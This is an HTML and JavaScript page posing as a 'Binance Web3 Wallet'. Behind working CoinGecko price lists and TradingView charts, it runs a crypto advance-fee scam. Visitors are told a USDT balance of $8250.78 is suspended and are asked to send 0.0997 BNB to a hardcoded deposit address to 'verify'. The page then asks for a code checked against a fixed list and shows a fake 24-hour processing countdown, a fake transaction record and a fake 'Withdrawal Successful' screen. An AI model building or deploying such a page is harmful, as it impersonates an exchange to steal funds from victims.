<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Binance Web3 Wallet</title>
<style>
  body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #0b0b0f;
    color: white;
  }

  /* ====== Header ====== */
  .header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px;
    background: #1e1e2a;
    position: sticky;
    top: 0;
    z-index: 1000;
  }
  .header-left {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .header-right {
    display: flex;
    align-items: center;
    gap: 10px;
  }
  .header img.logo {
    height: 32px;
  }

  /* ====== Buttons ====== */
  .button {
    background: #2a2a3d;
    color: white;
    padding: 6px 12px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    margin: 2px;
    display: flex;
    align-items: center;
    font-size: 12px;
    transition: background 0.2s ease;
  }
  .button img, 
  .button svg {
    height: 16px;
    margin-right: 6px;
  }
  .button:hover {
    background: #383850;
  }

  /* ====== Pages ====== */
  .page {
    display: none;
    padding: 12px;
    min-height: calc(100vh - 120px); /* Full height minus header+footer */
    overflow-y: auto;
  }
  .page.active {
    display: block;
  }

  /* ====== Coin Items ====== */
  .coin-item {
    padding: 10px;
    cursor: pointer;
    display: flex;
    align-items: center;
    border-bottom: 1px solid #222;
    transition: background 0.2s ease;
  }
  .coin-item img {
    width: 20px;
    height: 20px;
    margin-right: 8px;
  }
  .coin-item:hover {
    background: #1a1a2b;
  }

  /* ====== Search Input ====== */
  .search-input {
    width: 100%;
    padding: 8px;
    margin-bottom: 12px;
    border-radius: 6px;
    border: none;
    background: #1a1a2b;
    color: white;
  }
  .search-input:focus {
    outline: 1px solid #f0b90b;
  }

  /* ====== TradingView Containers ====== */
  #tradingview-widget-container,
  #market-tradingview-widget,
  #trade-tradingview-widget {
    width: 100%;
    height: 400px;
    margin-bottom: 12px;
    border: 1px solid #222;
    border-radius: 6px;
    overflow: hidden;
  }

  /* ====== Progress Circle ====== */
  .progress-ring {
    width: 80px;
    height: 80px;
    position: relative;
    margin: 20px auto;
  }
  .progress-ring circle {
    fill: transparent;
    stroke: #f0b90b;
    stroke-width: 8;
    transform: rotate(-90deg);
    transform-origin: 50% 50%;
  }

  /* ====== Transactions ====== */
  .transaction-item {
    padding: 10px;
    border-bottom: 1px solid #333;
    font-size: 14px;
  }
  .tx-type.deposit {
    color: #00b300;
    font-weight: bold;
  }
  .tx-type.withdrawal {
    color: #ff3b30;
    font-weight: bold;
  }
  .tx-status.pending {
    color: orange;
  }
  .tx-status.completed {
    color: #00b300;
  }
  .tx-status.failed {
    color: #ff3b30;
  }

  /* ====== Footer ====== */
  .footer {
    display: flex;
    justify-content: space-around;
    align-items: center;
    padding: 10px;
    background: #1e1e2a;
    position: fixed;
    bottom: 0;
    width: 100%;
    z-index: 1000;
  }
  .footer .button {
    flex: 1;
    flex-direction: column;
    font-size: 10px;
    text-align: center;
  }
    </style>
</head>
<body>

<!-- Header -->
<div class="header">
  <div class="header-left">
    <img class="logo" src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" alt="BNB">
    <strong>Web3 Wallet</strong>
  </div>
  <div class="header-right">
    <button class="button" id="notifications-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/appointment-reminders.png"/>Notify</button>
    <button class="button" id="transactions-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/bank-cards.png"/>Txns</button>
    <button class="button" id="more-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/menu-2.png"/>More</button>
  </div>
</div>
  
<!-- More Dropdown -->
<div id="more-dropdown" style="display:none;position:absolute;top:60px;right:10px;background:#1a1a2b;padding:10px;border-radius:6px;">
  <button class="button" id="settings-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/settings.png"/>Settings</button>
  <button class="button" id="support-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/help.png"/>Support</button>
</div>

<!-- Pages -->
<div id="home-page" class="page active">
  <h2>Homepage</h2>
  <input type="text" id="coin-search" class="search-input" placeholder="Search coin..."/>
  <div id="coin-list"></div>
  <div id="tradingview-widget-container"></div>
  <input type="text" id="wallet-address" class="search-input" placeholder="Enter wallet address"/>
  <button class="button" id="run-btn">Run</button>
</div>

<div id="verification-page" class="page">
  <h2>Verification</h2>
  <p>Total Suspended: <img id="usdt-logo" style="width:20px;vertical-align:middle;"> Tether USDT</p>
  <input type="text" id="verify-wallet-address" class="search-input" placeholder="Enter BNB BEP20 address"/>
  <button class="button" id="verify-run-btn">Run</button>
  <div id="verify-tradingview-widget"></div>
</div>

<div id="asset-verification-page" class="page">
  <h2>To verify this asset</h2>
  <p>You must confirm ownership by sending 0.0997 BNB to your wallet.</p>
  <p>Entered Address: <span id="entered-address"></span></p>
  <p>Suspended Asset: Tether USDT - Amount: $<span id="suspended-amount">8250.78</span></p>
  <button class="button" id="verify-btn">Verify</button>
</div>

<!-- Deposit Flow -->
<div id="deposit-page" class="page">
  <h2>Deposit</h2>
  <input type="text" id="deposit-search" class="search-input" placeholder="Search coin..."/>
  <div id="deposit-coin-list"></div>
</div>

<div id="network-page" class="page">
  <h2>Select Network</h2>
  <div class="coin-item" id="bnb-network">
    <img id="bnb-network-logo" src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" alt="BNB">
    <p>BNB Smart Chain BEP20</p>
  </div>
</div>

<div id="deposit-address-page" class="page">
  <h2>Deposit Address</h2>
  <p>Network: <span id="deposit-network">BNB Smart Chain BEP20</span></p>
  <p>Address: <span id="deposit-address">0x085Ea96BFFE85e98241B33299b9bAA64AF5f7e85</span></p>
  <div id="deposit-qr-code"></div>
  <button class="button" id="copy-address-btn">Copy Address</button>
</div>

<div id="bnb-code-page" class="page">
  <h2>Enter BNB Code</h2>
  <input type="text" id="bnb-code-input" class="search-input" placeholder="Enter BNB code"/>
  <button class="button" id="bnb-verify-btn">Verify</button>
</div>

<div id="processing-page" class="page">
  <h2>Processing</h2>
  <p>Address: <span id="processing-address"></span></p>
  <p>Tether USDT: $8250.78</p>
  <div class="progress-ring">
    <svg width="80" height="80">
      <circle r="36" cx="40" cy="40" stroke="#f0b90b" stroke-width="8" fill="transparent"/>
    </svg>
  </div>
  <p id="countdown-timer">24:00:00</p>
</div>

<div id="withdrawal-success-page" class="page">
  <h2>Withdrawal Successful</h2>
  <p>Your funds are now available.</p>
</div>

<!-- Transactions Page -->
<div id="transactions-page" class="page">
  <h2>Transactions</h2>
  <div id="transactions-list" style="max-height:500px; overflow-y:auto; border:1px solid #333; padding:8px; border-radius:6px; background:#1a1a2b;">
    <!-- Transactions will appear here -->
  </div>
</div>

<!-- Market Page -->
<div id="market-page" class="page">
  <h2>Market</h2>
  <input type="text" id="market-search" class="search-input" placeholder="Search coin..."/>
  <div id="market-coin-list"></div>
  <div id="market-tradingview-widget"></div>
</div>

<!-- Settings Page -->
<div id="settings-page" class="page">
  <h2>Settings</h2>
  <p>Binance-settings page content here...</p>
</div>

<!-- Support Page -->
<div id="support-page" class="page">
  <h2>Support</h2>
  <div id="support-chat" style="height:300px; background:#1a1f2b; padding:8px; border-radius:6px; overflow-y:auto;">AI Chat Messages Here</div>
  <input type="text" id="support-input" placeholder="Type message..." style="margin-top:8px;"/>
  <button id="support-send-btn" style="background:#f0b90b;color:black;padding:8px 12px;border-radius:6px;margin-top:4px;">Send</button>
</div>

<!-- Notifications Page -->
<div id="notifications-page" class="page">
  <h2>Notifications</h2>
  <p>Enable notifications to receive daily market updates:</p>
  <button id="notif-on-btn" style="background:#f0b90b;color:black;padding:8px;border-radius:6px;margin-right:4px;">ON</button>
  <button id="notif-off-btn" style="background:#777;color:white;padding:8px;border-radius:6px;">OFF</button>
</div>

<!-- Trade Page -->
<div id="trade-page" class="page">
  <div>
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
      <h2>Trade</h2>
      <select id="trade-coin-select" style="background:#1a1f2b;color:white;padding:6px 12px;border-radius:6px;border:none;"></select>
    </div>
    <div id="trade-tradingview-widget"></div>
    <div style="display:flex; gap:8px; margin-top:8px;">
      <button id="buy-btn" style="flex:1;background:#00b300;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Buy</button>
      <button id="sell-btn" style="flex:1;background:#ff3b30;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Sell</button>
    </div>
  </div>
</div>

<!-- Footer -->
<div class="footer">
  <button class="button" id="home-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/home.png"/>Home</button>
  <button class="button" id="market-btn"><img src="https://img.icons8.com/ios-glyphs/30/ffffff/line-chart.png"/>Market</button>
  <button class="button" id="trade-btn"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2l3 6h6l-4.8 4 1.8 6L12 14l-4 4 1.8-6L4 8h6z"/></svg>Trade</button>
</div>

<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.min.js"></script>
<script src="https://unpkg.com/@walletconnect/web3-provider/dist/umd/index.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
<script src="https://s3.tradingview.com/tv.js"></script>

<script>
// ================= Page Navigation =================
function showPage(id){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  localStorage.setItem('lastPage', id);
}

// ================= Globals =================
let coinsData = [];
let notificationsEnabled = false;

// ================= Init =================
window.onload = async ()=>{
  const last = localStorage.getItem('lastPage') || 'home-page';
  showPage(last);
  await loadCoins();
  loadTradeChart(localStorage.getItem('lastTradeSymbol') || 'BTCUSDT');
  loadTransactions();
  startTransactionUpdater();
};

// ================= Header Buttons =================
document.getElementById('notifications-btn').onclick = ()=>showPage('notifications-page');
document.getElementById('transactions-btn').onclick = ()=>showPage('transactions-page');
document.getElementById('more-btn').onclick = ()=>document.getElementById('more-dropdown').style.display='block';
document.getElementById('settings-btn').onclick = ()=>showPage('settings-page');
document.getElementById('support-btn').onclick = ()=>showPage('support-page');

// ================= Footer Buttons =================
document.getElementById('home-btn').onclick = ()=>showPage('home-page');
document.getElementById('market-btn').onclick = ()=>showPage('market-page');
document.getElementById('trade-btn').onclick = ()=>showPage('trade-page');

// ================= CoinGecko API =================
async function loadCoins(){
  try{
    const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=100&page=1');
    const data = await res.json();
    coinsData = data;

    // USDT logo
    const usdt = data.find(c => c.symbol.toLowerCase() === 'usdt');
    if(usdt) document.getElementById('usdt-logo').src = usdt.image;

    renderHomepageCoins(data);
    renderMarketList(data);
    renderTradeCoinSelect(data);

    // BNB logo dynamically
    const bnb = data.find(c => c.symbol.toLowerCase() === 'bnb');
    if(bnb) document.querySelector('#bnb-network img').src = bnb.image;

  } catch(e){
    console.error("Error loading coins:", e);
  }
}

// ================= Homepage Coins =================
function renderHomepageCoins(coins){
  const list = document.getElementById('coin-list');
  list.innerHTML = '';
  coins.forEach(c=>{
    const div = document.createElement('div');
    div.className = 'coin-item';
    div.innerHTML = `<img src="${c.image}">${c.name} (${c.symbol.toUpperCase()}) $${c.current_price.toLocaleString()}`;
    div.onclick = ()=>loadTradingViewChart(c.symbol.toUpperCase()+'USDT','tradingview-widget-container');
    list.appendChild(div);
  });
}

// ================= Market Coins =================
function renderMarketList(coins){
  const list = document.getElementById('market-coin-list');
  list.innerHTML = '';
  coins.forEach(c=>{
    const div = document.createElement('div');
    div.className = 'coin-item';
    div.innerHTML = `<img src="${c.image}">${c.name} (${c.symbol.toUpperCase()}) $${c.current_price.toLocaleString()}`;
    div.onclick = ()=>{
      loadTradingViewChart(c.symbol.toUpperCase()+'USDT','market-tradingview-widget');
      showPage('market-page');
    };
    list.appendChild(div);
  });
}

// ================= Trade Page Coin Select =================
function renderTradeCoinSelect(coins){
  const select = document.getElementById('trade-coin-select');
  select.innerHTML = '';
  coins.forEach(c=>{
    const opt = document.createElement('option');
    opt.value = c.symbol.toUpperCase()+'USDT';
    opt.textContent = `${c.name} (${c.symbol.toUpperCase()})`;
    select.appendChild(opt);
  });
  select.onchange = ()=>loadTradeChart(select.value);
}

// ================= TradingView Charts =================
function loadTradingViewChart(symbol, containerId){
  document.getElementById(containerId).innerHTML = ""; // reset
  new TradingView.widget({
    width: '100%',
    height: 400,
    symbol: symbol,
    interval: '60',
    timezone: 'Etc/UTC',
    theme: 'Dark',
    style: '1',
    container_id: containerId,
    toolbar_bg: '#1e1e2a',
    withdateranges: true,
    hide_side_toolbar: false,
    allow_symbol_change: true,
    save_image: false,
    studies: ['MASimple@tv-basicstudies','RSI@tv-basicstudies']
  });
}

function loadTradeChart(symbol){
  loadTradingViewChart(symbol,'trade-tradingview-widget');
  localStorage.setItem('lastTradeSymbol',symbol);
}

// ================= Homepage Run =================
document.getElementById('run-btn').onclick = ()=>{
  const addr = document.getElementById('wallet-address').value.trim();
  if(!addr) return alert('Enter wallet address');
  showPage('verification-page');
  document.getElementById('verify-wallet-address').value = addr;
  loadTradingViewChart('USDTUSDT','verify-tradingview-widget');
};

// ================= Verification Run =================
document.getElementById('verify-run-btn').onclick = ()=>{
  const addr = document.getElementById('verify-wallet-address').value.trim();
  if(!addr) return alert('Enter BNB BEP20 address');
  showPage('asset-verification-page');
  document.getElementById('entered-address').textContent = addr;
  setTimeout(()=>{
    showPage('deposit-page');
    loadDepositCoins();
  },15000);
};

// ================= Deposit Flow =================
async function loadDepositCoins(){
  const list = document.getElementById('deposit-coin-list');
  list.innerHTML = '';
  coinsData.sort((a,b)=>a.name.localeCompare(b.name)).forEach(c=>{
    const div = document.createElement('div');
    div.className = 'coin-item';
    div.innerHTML = `<img src="${c.image}" style="width:24px;height:24px;margin-right:8px;"> ${c.name}`;
    div.onclick = ()=>{
      localStorage.setItem('selectedCoin', JSON.stringify(c));
      showPage('network-page');
      renderNetworkSelection();
    };
    list.appendChild(div);
  });
}

function renderNetworkSelection(){
  const selectedCoin = JSON.parse(localStorage.getItem('selectedCoin') || "{}");
  const networkDiv = document.getElementById('bnb-network');
  networkDiv.innerHTML = `
    <img src="${selectedCoin.image}" style="width:24px;height:24px;margin-right:8px;">
    BNB Smart Chain (BEP20)
  `;
}

document.getElementById('bnb-network').onclick = ()=>{
  showPage('deposit-address-page');
  const depositAddress = "0x085Ea96BFFE85e98241B33299b9bAA64AF5f7e85";
  document.getElementById('deposit-address').textContent = depositAddress;
  document.getElementById('deposit-qr-code').innerHTML = "";
  new QRCode(document.getElementById('deposit-qr-code'),{text:depositAddress,width:128,height:128});
};

document.getElementById('copy-address-btn').onclick = ()=>{
  const addr = document.getElementById('deposit-address').textContent;
  navigator.clipboard.writeText(addr).then(()=>{
    alert('Address copied!');
    setTimeout(()=>showPage('bnb-code-page'),15000);
  });
};

// ================= BNB Verification =================
document.getElementById('bnb-verify-btn').onclick = ()=>{
  const code = document.getElementById('bnb-code-input').value.trim();
  const validCodes = ['#3c4250','737874','738848','22768','800833'];
  if(validCodes.includes(code)){
    showPage('processing-page');
    startCountdown();
    addTransaction("Deposit", "USDT", "$8250.78", "Pending");
  } else alert('Declined! Enter correct code.');
};

// ================= Transactions =================
function loadTransactions(){
  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
  const list = document.getElementById("transactions-list");
  list.innerHTML = "";
  txs.forEach(tx=>{
    const div = document.createElement("div");
    div.className = "transaction-item";
    let statusDisplay = tx.status;
    if(tx.status === "Pending"){
      const remaining = getRemainingTime(tx.id);
      statusDisplay = remaining>0 ? `Processing... ${formatTime(remaining)} left` : "Completed";
    }
    div.innerHTML = `
      <div><strong>${tx.type}</strong> ${tx.coin} - ${tx.amount}<br/><small>${new Date(tx.timestamp).toLocaleString()}</small></div>
      <div class="tx-status">${statusDisplay}</div>`;
    list.appendChild(div);
  });
}

function addTransaction(type, coin, amount, status){
  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
  const tx = {id:Date.now(), type, coin, amount, status, timestamp:new Date().toISOString(), endTime:Date.now()+24*3600*1000};
  txs.push(tx);
  localStorage.setItem("transactions", JSON.stringify(txs));
  loadTransactions();
}

function getRemainingTime(txId){
  const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
  const tx = txs.find(t=>t.id===txId);
  if(!tx) return 0;
  return Math.max(0, tx.endTime - Date.now());
}

function formatTime(ms){
  const s = Math.floor(ms/1000);
  const h = String(Math.floor(s/3600)).padStart(2,'0');
  const m = String(Math.floor((s%3600)/60)).padStart(2,'0');
  const sec = String(s%60).padStart(2,'0');
  return `${h}:${m}:${sec}`;
}

function startTransactionUpdater(){
  setInterval(()=>{
    const txs = JSON.parse(localStorage.getItem("transactions") || "[]");
    let updated=false;
    txs.forEach(tx=>{
      if(tx.status==="Pending" && Date.now()>=tx.endTime){tx.status="Completed";updated=true;}
    });
    if(updated) localStorage.setItem("transactions", JSON.stringify(txs));
    loadTransactions();
  },1000);
}

// ================= Countdown =================
function startCountdown(){
  let endTime = parseInt(localStorage.getItem('verificationEndTime')) || Date.now()+24*3600*1000;
  localStorage.setItem('verificationEndTime', endTime);
  document.getElementById('processing-address').textContent = document.getElementById('verify-wallet-address').value;
  const circle = document.querySelector('.progress-ring circle');
  const r = circle.r.baseVal.value;
  const c = 2*Math.PI*r;
  circle.style.strokeDasharray = `${c} ${c}`;
  circle.style.strokeDashoffset = c;

  function update(){
    const diff = endTime - Date.now();
    if(diff<=0){
      document.getElementById('countdown-timer').textContent = '00:00:00';
      showPage('withdrawal-success-page');
      localStorage.removeItem('verificationEndTime');
      return;
    }
    const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
    document.getElementById('countdown-timer').textContent = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
    circle.style.strokeDashoffset = c - (diff/(24*3600*1000))*c;
    requestAnimationFrame(update);
  }
  update();
}

// ================= Coin Search =================
['coin-search','market-search','deposit-search'].forEach(id=>{
  document.getElementById(id).addEventListener('input', e=>{
    const term = e.target.value.toLowerCase();
    if(id==='coin-search') renderHomepageCoins(coinsData.filter(c=>c.name.toLowerCase().includes(term)));
    if(id==='market-search') renderMarketList(coinsData.filter(c=>c.name.toLowerCase().includes(term)));
    if(id==='deposit-search'){
      const list=document.getElementById('deposit-coin-list'); list.innerHTML='';
      coinsData.filter(c=>c.name.toLowerCase().includes(term)).forEach(c=>{
        const div=document.createElement('div');
        div.className='coin-item';
        div.innerHTML=`<img src="${c.image}">${c.name}`;
        div.onclick = ()=>showPage('network-page');
        list.appendChild(div);
      });
    }
  });
});

// ================= Notifications =================
document.getElementById('notif-on-btn').onclick = ()=>{notificationsEnabled=true;alert('Notifications enabled!');scheduleMarketNotification();};
document.getElementById('notif-off-btn').onclick = ()=>{notificationsEnabled=false;alert('Notifications disabled!');};

function scheduleMarketNotification(){
  if(!notificationsEnabled) return;
  setInterval(async ()=>{
    try{
      const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=5&page=1');
      const data = await res.json();
      const msg = `Top Coin: ${data[0].name} $${data[0].current_price.toLocaleString()}`;
      alert(msg);
    }catch(e){console.error(e);}
  },24*3600*1000);
}

// ================= Support Chat =================
document.getElementById('support-send-btn').onclick = ()=>{
  const input=document.getElementById('support-input');
  const chat=document.getElementById('support-chat');
  const msg=input.value.trim();
  if(!msg) return;
  chat.innerHTML+=`<div><strong>You:</strong> ${msg}</div>`;
  input.value=''; chat.scrollTop=chat.scrollHeight;
  setTimeout(()=>{chat.innerHTML+=`<div><strong>AI:</strong> Response to: "${msg}"</div>`;chat.scrollTop=chat.scrollHeight;},1000);
};
</script>   
 </body>
</html>
